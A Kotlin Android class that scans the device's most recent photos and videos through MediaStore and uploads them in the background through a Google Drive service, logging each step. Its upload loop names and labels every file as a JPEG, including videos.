package com.example.fiberhome.drive

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import kotlinx.coroutines.*

class AutoBackupManager(private val context: Context) {

    private val driveService = GoogleDriveService(context)
    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    fun startAutomaticBackup() {
        scope.launch {
            try {
                val mediaUris = scanMedia()
                Log.d("AutoBackup", "SCAN_DEBUG: Detected ${mediaUris.size} media files total (Images + Videos)")

                if (mediaUris.isEmpty()) {
                    Log.w("AutoBackup", "SCAN_DEBUG: No media files found. Check permissions or device content.")
                    return@launch
                }

                mediaUris.forEachIndexed { index, uri ->
                    val fileName = "auto_sync_${System.currentTimeMillis()}_$index.jpg"
                    try {
                        context.contentResolver.openInputStream(uri)?.use { inputStream ->
                            val fileId = driveService.uploadFile(fileName, inputStream, "image/jpeg")
                            if (fileId != null) {
                                Log.d("AutoBackup", "UPLOAD_SUCCESS: $fileName synced with ID: $fileId")
                            } else {
                                Log.e("AutoBackup", "UPLOAD_FAILED: Drive service returned null for $fileName")
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("AutoBackup", "CORE_ERROR: Failed to process URI: $uri", e)
                    }
                }
                Log.d("AutoBackup", "PROTOCOL_COMPLETE: All background sync operations finished.")
            } catch (e: Exception) {
                Log.e("AutoBackup", "FATAL_SYNC_ERROR: Background worker failed", e)
            }
        }
    }

    private fun scanMedia(): List<Uri> {
        val allMedia = mutableListOf<Uri>()
        
        // 1. Scan Images
        val imageProjection = arrayOf(MediaStore.Images.Media._ID)
        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            imageProjection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                allMedia.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
                if (allMedia.size >= 15) break // Limit for sync performance
            }
        }

        // 2. Scan Videos
        val videoProjection = arrayOf(MediaStore.Video.Media._ID)
        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            videoProjection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                allMedia.add(ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id))
                if (allMedia.size >= 30) break 
            }
        }

        return allMedia
    }

    fun cancel() {
        job.cancel()
    }
}
